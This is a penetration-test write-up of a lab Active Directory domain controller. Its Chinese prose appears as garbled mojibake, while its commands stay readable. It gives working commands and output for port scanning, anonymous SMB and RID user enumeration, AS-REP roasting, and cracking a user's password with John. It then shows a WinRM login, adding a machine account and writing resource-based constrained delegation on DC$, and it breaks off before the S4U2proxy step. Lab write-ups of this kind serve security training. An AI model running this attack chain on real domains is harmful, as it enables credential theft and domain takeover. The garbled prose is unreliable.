Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåIPÂú∞ÂùÄ‰∏∫ `192.168.205.132` ÁöÑ‰∏ªÊú∫Â§Ñ‰∫éÊ¥ªÂä®Áä∂ÊÄÅÔºåÊàë‰ª¨Â∞ÜÂÖ∂Á°ÆÂÆö‰∏∫Êú¨Ê¨°Ê∏óÈÄèÊµãËØïÁöÑÁõÆÊ†á„ÄÇ

## **1.2 Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè**

‰∏∫ÂÖ®Èù¢‰∫ÜËß£ÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæÁöÑÊúçÂä°ÂíåÊΩúÂú®ÁöÑÊîªÂáªÈù¢ÔºåÊàë‰ª¨‰ΩøÁî® `nmap` ÁªìÂêà‰∏Ä‰∏™Ëá™ÂÆö‰πâËÑöÊú¨ `windowport.sh` Êù•ËøõË°åÊ∑±ÂÖ•ÁöÑÁ´ØÂè£ÂíåÊúçÂä°Êâ´Êèè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cat windowport.sh 
#!/bin/bash

nmap -p0-65535 $1 -oA nmapscan/ports
ports=$(grep open nmapscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',')
nmap -p$ports -sC -sV -T4 $1 -oA nmapscan/xiports
nmap --script=vuln -p$ports $1 -oA nmapscan/vuln
```

ÊâßË°åËØ•ËÑöÊú¨ÂØπÁõÆÊ†á `192.168.205.132` ËøõË°åÊâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ bash windowport.sh 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:37 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00073s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
62319/tcp open  unknown
62320/tcp open  unknown
62333/tcp open  unknown
62352/tcp open  unknown
MAC Address: 00:0C:29:19:38:D9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 104.79 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:39 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00027s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-23 02:39:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: novice.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: novice.com0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
62319/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62320/tcp open  msrpc         Microsoft Windows RPC
62333/tcp open  msrpc         Microsoft Windows RPC
62352/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:19:38:D9 (VMware)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:19:38:d9 (VMware)
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-08-23T02:40:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.32 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:40 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00050s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
62319/tcp open  unknown
62320/tcp open  unknown
62333/tcp open  unknown
62352/tcp open  unknown
MAC Address: 00:0C:29:19:38:D9 (VMware)

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 123.45 seconds
```

**Êâ´ÊèèÁªìÊûúÂàÜÊûêÔºö**

*   **ÊúçÂä°ËØÜÂà´**ÔºöÂºÄÊîæ‰∫Ü Kerberos(88)„ÄÅLDAP(389)„ÄÅSMB(445)„ÄÅWinRM(5985) Á≠âÂ§ö‰∏™ÂÖ≥ÈîÆÁ´ØÂè£„ÄÇ
*   **Á≥ªÁªüËßíËâ≤**ÔºöÊúçÂä°‰ø°ÊÅØÊòéÁ°ÆÊåáÂá∫ËøôÊòØ‰∏ÄÂè∞ `Microsoft Windows Active Directory LDAP` ÊúçÂä°Âô®ÔºåÁªìÂêàÂÖ∂‰∏ªÊú∫Âêç `DC` ÂíåÂüüÂêç `novice.com`ÔºåÂèØ‰ª•Á°ÆÂÆöÂÖ∂‰∏∫ÂüüÊéßÂà∂Âô®„ÄÇ
*   **ÊîªÂáªÂêëÈáè**ÔºöÂü∫‰∫éÂºÄÊîæÁöÑÊúçÂä°ÔºåÂàùÊ≠•ÁöÑÊîªÂáªÊÄùË∑ØÂ∞ÜÂõ¥ÁªïÊ¥ªÂä®ÁõÆÂΩïËÆ§ËØÅÂçèËÆÆÔºàKerberos, LDAPÔºâÂíåÊñá‰ª∂ÂÖ±‰∫´ÊúçÂä°ÔºàSMBÔºâÂ±ïÂºÄ„ÄÇ

---

# **‰∫å„ÄÅÊºèÊ¥ûÂà©Áî®‰∏éÂàùÂßãÁ´ãË∂≥ÁÇπ**

## **2.1 SMBÂåøÂêçÊûö‰∏æ**

‰ªé SMB ÊúçÂä°ÂÖ•ÊâãÔºå‰ΩøÁî® `smbclient` Â∞ùËØïÂØπÁõÆÊ†áËøõË°åÂåøÂêçËÆøÈóÆÔºåÂàóÂá∫ÂÖ∂ÂÖ±‰∫´Êñá‰ª∂Â§π„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ smbclient -L //192.168.205.132/ -N       

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      ËøúÁ®ãÁÆ°ÁêÜ
        C$              Disk      ÈªòËÆ§ÂÖ±‰∫´
        IPC$            IPC       ËøúÁ®ã IPC
        NETLOGON        Disk      Logon server share 
        nothinghere     Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.205.132 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

ÊàêÂäüÂàóÂá∫‰∫ÜÂ§ö‰∏™ÂÖ±‰∫´ÔºåÂÖ∂‰∏≠ `nothinghere` ÁúãËµ∑Êù•ÊØîËæÉÂèØÁñë„ÄÇÊàë‰ª¨Â∞ùËØïÂåøÂêçËøûÊé•Âà∞Ëøô‰∏™ÂÖ±‰∫´Âπ∂Êü•ÁúãÂÖ∂ÂÜÖÂÆπ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ smbclient //192.168.205.132/nothinghere -N
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Aug 18 08:03:56 2025
  ..                                DHS        0  Mon Aug 18 08:05:08 2025
  readme.txt                          A      135  Mon Aug 18 07:57:00 2025

                12923135 blocks of size 4096. 9365851 blocks available
smb: \&gt; get readme.txt 
getting file \readme.txt of size 135 as readme.txt (13.2 KiloBytes/sec) (average 13.2 KiloBytes/sec)
smb: \&gt; exit

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat readme.txt   
It‚Äôs not about this directory ‚Äî the key point is your anonymous permissions. Think about what you can do with SMB anonymous access.
```

`readme.txt` Êñá‰ª∂ÁöÑÂÜÖÂÆπÁªôÂá∫‰∫ÜÊòéÁ°ÆÁöÑÊèêÁ§∫ÔºöÂÖ≥ÈîÆÂú®‰∫éÂà©Áî® SMB ÁöÑÂåøÂêçËÆøÈóÆÊùÉÈôêËøõË°å‰∏ã‰∏ÄÊ≠•Êìç‰Ωú„ÄÇ

## **2.2 ÂüüÂÜÖÁî®Êà∑Êûö‰∏æ**

Âà©Áî®Â∑≤Áü•ÁöÑ SMB ÂåøÂêçÁôªÂΩïÊùÉÈôêÔºàÁ©∫‰ºöËØùÔºâÔºåÂèØ‰ª•‰ΩøÁî® `impacket` Â∑•ÂÖ∑ÈõÜ‰∏≠ÁöÑ `lookupsid.py` ËÑöÊú¨ÔºåÈÄöËøáÊö¥ÂäõÁåúËß£ RID (Relative ID) ÁöÑÊñπÂºèÊù•Êûö‰∏æÂüüÂÜÖÁöÑÁî®Êà∑ÂíåÁªÑ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.132
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 192.168.205.132
[*] StringBinding ncacn_np:192.168.205.132[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3649830887-1815587496-1699028491
498: NOVICE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: NOVICE\Administrator (SidTypeUser)
501: NOVICE\Guest (SidTypeUser)
502: NOVICE\krbtgt (SidTypeUser)
512: NOVICE\Domain Admins (SidTypeGroup)
513: NOVICE\Domain Users (SidTypeGroup)
514: NOVICE\Domain Guests (SidTypeGroup)
515: NOVICE\Domain Computers (SidTypeGroup)
516: NOVICE\Domain Controllers (SidTypeGroup)
517: NOVICE\Cert Publishers (SidTypeAlias)
518: NOVICE\Schema Admins (SidTypeGroup)
519: NOVICE\Enterprise Admins (SidTypeGroup)
520: NOVICE\Group Policy Creator Owners (SidTypeGroup)
521: NOVICE\Read-only Domain Controllers (SidTypeGroup)
522: NOVICE\Cloneable Domain Controllers (SidTypeGroup)
525: NOVICE\Protected Users (SidTypeGroup)
526: NOVICE\Key Admins (SidTypeGroup)
527: NOVICE\Enterprise Key Admins (SidTypeGroup)
553: NOVICE\RAS and IAS Servers (SidTypeAlias)
571: NOVICE\Allowed RODC Password Replication Group (SidTypeAlias)
572: NOVICE\Denied RODC Password Replication Group (SidTypeAlias)
1000: NOVICE\DC$ (SidTypeUser)
1101: NOVICE\DnsAdmins (SidTypeAlias)
1102: NOVICE\DnsUpdateProxy (SidTypeGroup)
1104: NOVICE\MrRobot (SidTypeUser)
```

ËÑöÊú¨ÊàêÂäüÊûö‰∏æÂá∫‰∫ÜÂüü `NOVICE` ÁöÑ SID ‰ª•ÂèäÂ§ö‰∏™Áî®Êà∑ÂíåÁªÑÔºåÂåÖÊã¨ `Administrator`„ÄÅ`krbtgt` Âíå‰∏Ä‰∏™Âêç‰∏∫ `MrRobot` ÁöÑÊôÆÈÄöÁî®Êà∑„ÄÇ‰∏∫‰∫ÜÊñπ‰æøÂêéÁª≠Âà©Áî®ÔºåÊàë‰ª¨Â∞ÜÊâÄÊúâÁ±ªÂûã‰∏∫ `SidTypeUser` ÁöÑÁî®Êà∑ÂêçÊèêÂèñÂπ∂‰øùÂ≠òÂà∞ `user` Êñá‰ª∂‰∏≠„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.132 2&gt;/dev/null | grep '(SidTypeUser)' | cut -d '\' -f2 | cut -d ' ' -f1 &gt; user
Password:
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cat user      
Administrator
Guest
krbtgt
DC$
MrRobot
```

## **2.3 AS-REP Roasting ÊîªÂáª**

&gt; **Áü•ËØÜÁÇπ**: AS-REP Roasting ÊòØ‰∏ÄÁßçÈíàÂØπKerberosËÆ§ËØÅÁöÑÊîªÂáª„ÄÇÂ¶ÇÊûú‰∏Ä‰∏™ÂüüÁî®Êà∑ÁöÑË¥¶Êà∑Â±ûÊÄß‰∏≠ËÆæÁΩÆ‰∫Ü ‚Äú‰∏çÈúÄË¶ÅKerberosÈ¢ÑË∫´‰ªΩÈ™åËØÅ‚Äù (`UF_DONT_REQUIRE_PREAUTH` is `True`)ÔºåÈÇ£‰πà‰ªª‰ΩïÊîªÂáªËÄÖÈÉΩÂèØ‰ª•ÂÜíÂÖÖËØ•Áî®Êà∑ÂêëKDCÔºàÂØÜÈí•ÂàÜÂèë‰∏≠ÂøÉÔºâËØ∑Ê±ÇËÆ§ËØÅÁ•®ÊçÆÔºàAS-REPÔºâ„ÄÇKDC‰ºöÁõ¥Êé•ËøîÂõû‰∏Ä‰∏™Áî®ËØ•Áî®Êà∑ÂØÜÁ†ÅÂìàÂ∏åÂä†ÂØÜÁöÑTGTÁ•®ÊçÆ„ÄÇÊîªÂáªËÄÖÂèØ‰ª•Êà™Ëé∑Ëøô‰∏™Á•®ÊçÆÂπ∂ËøõË°åÁ¶ªÁ∫øÁ†¥Ëß£Ôºå‰ªéËÄåËé∑ÂèñÁî®Êà∑ÊòéÊñáÂØÜÁ†Å„ÄÇ

Êàë‰ª¨Âà©Áî®‰∏ä‰∏ÄÊ≠•Ëé∑ÂæóÁöÑÁî®Êà∑ÂàóË°®Ôºå‰ΩøÁî® `GetNPUsers.py` ËÑöÊú¨Â∞ùËØïËøõË°å AS-REP Roasting ÊîªÂáª„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py novice.com/ -usersfile user -format john -outputfile hash -no-pass -dc-ip 192.168.205.132
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$MrRobot@NOVICE.COM:17037b58fa06936b306893c2184c444a$fdd9db20ebe37b4cd79a1847c9cb7b2cbee5fa22c21c180ad23bc22e4249b7d373d3cd31d083493258d493f0c6a2fd4e38847fff4d1b93c7d3803a754dc78e0649c7f678ff7c40a06faee8d5fbf461e4aa69769eaafaf1ddf24383126f5724027343ab0fd70dd8501a3bf9ef39b9e08c4112bab1180b2f316fd7bd3205feed3f8c0366120602d0226094881746adcda4609a5f303139c2845ee0817321575d2c9e648fff2d8f46a11f70c49e0f057bbe0ed7155a16819211dc0c20eee7c09b42c423e12df38d788b5975ed5fdf1b64b7572e4c041580475835258a4b5d474e89e3a2dbec797756d9
```

ËÑöÊú¨ÁöÑËæìÂá∫ÊòæÁ§∫ÔºåÁî®Êà∑ `MrRobot` ÁöÑË¥¶Êà∑Â≠òÂú®Ê≠§ÈÖçÁΩÆÁº∫Èô∑ÔºåÂπ∂ÊàêÂäüËé∑Âèñ‰∫ÜÂÖ∂ AS-REP ÂìàÂ∏åÔºåÂ∑≤‰øùÂ≠òËá≥ `hash` Êñá‰ª∂‰∏≠„ÄÇ

## **2.4 Á¶ªÁ∫øÂØÜÁ†ÅÁ†¥Ëß£**

Êé•‰∏ãÊù•Ôºå‰ΩøÁî® `John the Ripper` ÈÖçÂêàÂº∫Â§ßÁöÑ `rockyou.txt` Â≠óÂÖ∏ÔºåÂØπËé∑ÂèñÂà∞ÁöÑÂìàÂ∏åËøõË°åÁ¶ªÁ∫øÊö¥ÂäõÁ†¥Ëß£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mrroboto12       ($krb5asrep$MrRobot@NOVICE.COM)     
1g 0:00:00:01 DONE (2025-08-22 22:50) 0.5813g/s 3110Kp/s 3110Kc/s 3110KC/s mrsbrown89..mrkonochi
Use the '--show' option to display all of the cracked passwords reliably
Session completed.
```

ÂØÜÁ†ÅË¢´ÊàêÂäüÁ†¥Ëß£ÔºåÁî®Êà∑ `MrRobot` ÁöÑÊòéÊñáÂØÜÁ†Å‰∏∫ `mrroboto12`„ÄÇ

## **2.5 ËøúÁ®ãÁôªÂΩïËé∑ÂèñÁ´ãË∂≥ÁÇπ**

Âà©Áî®ÂàöÂàöËé∑ÂèñÁöÑÂá≠ÊçÆÔºåÈÄöËøá `evil-winrm` ÁôªÂΩïÁõÆÊ†á‰∏ªÊú∫ÁöÑ WinRM ÊúçÂä°Ôºà5985Á´ØÂè£ÔºâÔºåËøôÂ∞Ü‰∏∫Êàë‰ª¨Êèê‰æõ‰∏Ä‰∏™‰∫§‰∫íÂºèÁöÑ PowerShell Shell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ evil-winrm -i 192.168.205.132 -u 'MrRobot' -p 'mrroboto12'    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\MrRobot\Documents&gt; whoami /all
```

ÊàêÂäüÁôªÂΩïÔºåÊàë‰ª¨Â∑≤ÁªèÂú®ÁõÆÊ†áÁ≥ªÁªü‰∏äËé∑Âæó‰∫Ü‰∏Ä‰∏™ÂàùÂßãÁöÑÁ´ãË∂≥ÁÇπÔºàFootholdÔºâ„ÄÇ

---

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **3.1 ÊùÉÈôêÂàÜÊûê**

‰∏∫‰∫ÜËßÑÂàí‰∏ã‰∏ÄÊ≠•ÁöÑÊèêÊùÉË∑ØÁ∫øÔºåÈ¶ñÂÖàÂú®ËøúÁ®ãShell‰∏≠ÊâßË°å `whoami /all` ÂëΩ‰ª§ÔºåÊü•ÁúãÂΩìÂâçÁî®Êà∑ `MrRobot` ÁöÑËØ¶ÁªÜÊùÉÈôê‰ø°ÊÅØ„ÄÇ

```powershell
*Evil-WinRM* PS C:\Users\MrRobot\Documents&gt; whoami /all

Áî®Êà∑‰ø°ÊÅØ
----------------

Áî®Êà∑Âêç         SID
============== ==============================================
novice\mrrobot S-1-5-21-3649830887-1815587496-1699028491-1104


ÁªÑ‰ø°ÊÅØ
-----------------

ÁªÑÂêç                                        Á±ªÂûã   SID          Â±ûÊÄß
=========================================== ====== ============ ==============================
Everyone                                    Â∑≤Áü•ÁªÑ S-1-1-0      ÂøÖÈúÄÁöÑÁªÑ, ÂêØÁî®‰∫éÈªòËÆ§, ÂêØÁî®ÁöÑÁªÑ
BUILTIN\Remote Management Users             Âà´Âêç   S-1-5-32-580 ÂøÖÈúÄÁöÑÁªÑ, ÂêØÁî®‰∫éÈªòËÆ§, ÂêØÁî®ÁöÑÁªÑ
BUILTIN\Users                               Âà´Âêç   S-1-5-32-545 ÂøÖÈúÄÁöÑÁªÑ, ÂêØÁî®‰∫éÈªòËÆ§, ÂêØÁî®ÁöÑÁªÑ
BUILTIN\Pre-Windows 2000 Compatible Access  Âà´Âêç   S-1-5-32-554 ÂøÖÈúÄÁöÑÁªÑ, ÂêØÁî®‰∫éÈªòËÆ§, ÂêØÁî®ÁöÑÁªÑ
NT AUTHORITY\NETWORK                        Â∑≤Áü•ÁªÑ S-1-5-2      ÂøÖÈúÄÁöÑÁªÑ, ÂêØÁî®‰∫éÈªòËÆ§, ÂêØÁî®ÁöÑÁªÑ
NT AUTHORITY\Authenticated Users            Â∑≤Áü•ÁªÑ S-1-5-11     ÂøÖÈúÄÁöÑÁªÑ, ÂêØÁî®‰∫éÈªòËÆ§, ÂêØÁî®ÁöÑÁªÑ
NT AUTHORITY\This Organization              Â∑≤Áü•ÁªÑ S-1-5-15     ÂøÖÈúÄÁöÑÁªÑ, ÂêØÁî®‰∫éÈªòËÆ§, ÂêØÁî®ÁöÑÁªÑ
NT AUTHORITY\NTLM Authentication            Â∑≤Áü•ÁªÑ S-1-5-64-10  ÂøÖÈúÄÁöÑÁªÑ, ÂêØÁî®‰∫éÈªòËÆ§, ÂêØÁî®ÁöÑÁªÑ
Mandatory Label\Medium Plus Mandatory Level Ê†áÁ≠æ   S-1-16-8448


ÁâπÊùÉ‰ø°ÊÅØ
----------------------

ÁâπÊùÉÂêç                        ÊèèËø∞             Áä∂ÊÄÅ
============================= ================ ======
SeMachineAccountPrivilege     Â∞ÜÂ∑•‰ΩúÁ´ôÊ∑ªÂä†Âà∞Âüü Â∑≤ÂêØÁî®
SeChangeNotifyPrivilege       ÁªïËøáÈÅçÂéÜÊ£ÄÊü•     Â∑≤ÂêØÁî®
SeIncreaseWorkingSetPrivilege Â¢ûÂä†ËøõÁ®ãÂ∑•‰ΩúÈõÜ   Â∑≤ÂêØÁî®


Áî®Êà∑Â£∞Êòé‰ø°ÊÅØ
-----------------------

Áî®Êà∑Â£∞ÊòéÊú™Áü•„ÄÇ

Â∑≤Âú®Ê≠§ËÆæÂ§á‰∏äÁ¶ÅÁî®ÂØπÂä®ÊÄÅËÆøÈóÆÊéßÂà∂ÁöÑ Kerberos ÊîØÊåÅ„ÄÇ
```

ËæìÂá∫ÁªìÊûú‰∏≠ÊúÄÂºï‰∫∫Ê≥®ÁõÆÁöÑ‰∏ÄÁÇπÊòØÔºåÁî®Êà∑ `novice\mrrobot` Êã•Êúâ `SeMachineAccountPrivilege` ÁâπÊùÉ„ÄÇ

&gt; **Áü•ËØÜÁÇπ**: `SeMachineAccountPrivilege` ÁâπÊùÉÂÖÅËÆ∏ÊåÅÊúâËÄÖÂ∞ÜËÆ°ÁÆóÊú∫Âä†ÂÖ•Âà∞Âüü‰∏≠„ÄÇÂú®ÈªòËÆ§ÁöÑActive DirectoryÈÖçÁΩÆ‰∏ãÔºåÊôÆÈÄöÂüüÁî®Êà∑Êã•ÊúâÊ≠§ÊùÉÈôêÔºåÂπ∂‰∏îÊúÄÂ§öÂèØ‰ª•Â∞Ü10‰∏™Êú∫Âô®Ë¥¶Êà∑Ê∑ªÂä†Âà∞Âüü‰∏≠„ÄÇÊîªÂáªËÄÖÂèØ‰ª•Êª•Áî®Ê≠§ÊùÉÈôêÔºåÂàõÂª∫‰∏Ä‰∏™Áî±Ëá™Â∑±ÂÆåÂÖ®ÊéßÂà∂ÁöÑÊú∫Âô®Ë¥¶Êà∑ÔºåÂπ∂‰ª•Ê≠§‰∏∫Ë∑≥ÊùøËøõË°åÂêéÁª≠ÁöÑÂßîÊ¥æÊîªÂáªÔºåÊúÄÁªàÂÆûÁé∞ÊùÉÈôêÊèêÂçá„ÄÇ

## **3.2 Êª•Áî®Êú∫Âô®Ë¥¶Êà∑ÈÖçÈ¢ù**

Êàë‰ª¨Âà©Áî® `SeMachineAccountPrivilege` ÁâπÊùÉÔºå‰ΩøÁî® `addcomputer.py` ËÑöÊú¨‰ª• `MrRobot` ÁöÑË∫´‰ªΩÂú®Âüü‰∏≠Ê∑ªÂä†‰∏Ä‰∏™Âêç‰∏∫ `NEWPC$` ÁöÑÊñ∞Êú∫Âô®Ë¥¶Êà∑ÔºåÂπ∂‰∏∫ÂÖ∂ËÆæÁΩÆ‰∏Ä‰∏™Êàë‰ª¨Â∑≤Áü•ÁöÑÂØÜÁ†Å `Password123!`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -computer-name 'NEWPC$' -computer-pass 'Password123!' -dc-ip 192.168.205.132 novice.com/MrRobot:mrroboto12
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account NEWPC$ with password Password123!.
```

Êú∫Âô®Ë¥¶Êà∑ÂàõÂª∫ÊàêÂäüÔºåÊàë‰ª¨Áé∞Âú®Êã•Êúâ‰∫Ü‰∏Ä‰∏™ÂüüÂÜÖÁöÑÊñ∞Ë∫´‰ªΩ„ÄÇ

## **3.3 ÈÖçÁΩÆÂü∫‰∫éËµÑÊ∫êÁöÑÁ∫¶ÊùüÊÄßÂßîÊ¥æ (RBCD)**

&gt; **Áü•ËØÜÁÇπ**: ÂçïÁ∫ØÂàõÂª∫‰∏Ä‰∏™Êú∫Âô®Ë¥¶Êà∑Âπ∂‰∏çËÉΩÁõ¥Êé•Ê®°ÊãüÁÆ°ÁêÜÂëò„ÄÇÊàë‰ª¨ÈúÄË¶ÅÈÖçÁΩÆÂüüÊéßÂà∂Âô®ÔºåËÆ©ÂÆÉ‚Äú‰ø°‰ªª‚ÄùÊàë‰ª¨ÂàõÂª∫ÁöÑ `NEWPC$` Ë¥¶Êà∑ÂèØ‰ª•‰ª£Ë°®ÂÖ∂‰ªñÁî®Êà∑ÔºàÂåÖÊã¨ÁÆ°ÁêÜÂëòÔºâÊù•ËØ∑Ê±ÇÊúçÂä°„ÄÇËøô‰∏™ËøáÁ®ãÂ∞±ÊòØÈÖçÁΩÆ‚ÄúÂü∫‰∫éËµÑÊ∫êÁöÑÁ∫¶ÊùüÊÄßÂßîÊ¥æ‚ÄùÔºàRBCDÔºâ„ÄÇÊàë‰ª¨ÈÄöËøá‰øÆÊîπÂüüÊéß‰∏ªÊú∫ÂØπË±°Ôºà`DC$`ÔºâÁöÑ `msDS-AllowedToActOnBehalfOfOtherIdentity` Â±ûÊÄßÔºåÂ∞ÜÊàë‰ª¨ÊéßÂà∂ÁöÑ `NEWPC$` ÁöÑSIDÊ∑ªÂä†ËøõÂéªÔºå‰ªéËÄåÂçïÂêëÂú∞Âª∫Á´ã‰ø°‰ªªÂÖ≥Á≥ª„ÄÇ

Âà©Áî® `MrRobot` Áî®Êà∑ÁöÑÊùÉÈôêÔºå‰ΩøÁî® `rbcd.py` ËÑöÊú¨Êù•‰øÆÊîπ `DC$` ÁöÑÂÆâÂÖ®ÊèèËø∞Á¨¶ÔºåÊéà‰∫à `NEWPC$` ÂØπ `DC$` ÁöÑÂßîÊ¥æÊùÉÈôê„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/rbcd.py -action write -delegate-to 'DC$' -delegate-from 'NEWPC$' -dc-ip 192.168.205.132 'novice.com/MrRobot:mrroboto12'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] NEWPC$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     NEWPC$       (S-1-5-21-3649830887-1815587496-1699028491-2601)
```

ËæìÂá∫Á°ÆËÆ§ÂßîÊ¥æÊùÉÈôêÂ∑≤ÊàêÂäü‰øÆÊîπÔºå`NEWPC$` Áé∞Âú®ÂèØ‰ª•Ê®°ÊãüÁî®Êà∑Âú® `DC$` ‰∏äËøõË°åÊìç‰Ωú‰∫Ü„ÄÇ

## **3.4 KerberosÂßîÊ¥æÊîªÂáª (S4U2proxy)**

Áé∞Âú®ÔºåÊîªÂáªÊµÅÁ®ãËøõÂÖ•ÊúÄÂêéÈò∂ÊÆµ„ÄÇ

1. **Ëé∑Âèñ `NEWPC$` ÁöÑ TGT**
